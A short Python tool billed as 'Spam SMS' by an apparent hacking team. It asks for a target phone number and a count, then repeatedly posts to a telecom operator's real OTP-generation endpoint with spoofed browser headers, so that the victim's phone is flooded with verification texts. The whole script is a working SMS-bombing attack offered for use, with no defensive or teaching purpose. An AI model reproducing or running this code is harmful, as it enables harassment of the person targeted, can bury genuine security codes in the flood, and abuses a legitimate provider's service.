import os, requests
from requests import post
import termcolor
from termcolor import colored
import time
os.system("clear")
banner = """
<×======================================×>
  |Code by : Mr.FaDedTy                          |
  |Github : https://github.com/F4DeDty|
  |Team :  3XPLOIT.ID                               |
  |Tools : Spam SMS                                |
<×======================================×>
 """
s = requests.Session()
print(banner)
no = input(colored('NOMOR TARGET:','red'))
jml = int(input(colored('JUMLAH:','red')))

 
url =  "https://registrasi.tri.co.id/daftar/generateOTP"
 
# headers
ua = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Referer': 'https://registrasi.tri.co.id/daftar',
}

dat = {
"msisdn": no,
'phone': no,
}

for x in range(jml):
	time.sleep(5)
	respon = s.post(url, data=dat, headers=ua)
#	print(respon.json())

	if 'success' in respon.text:
		print("PESAN BERHASIL TERKIRIM KE", no)
	else:
		print("PESAN GAGAL TERKIRIM KE ", no)
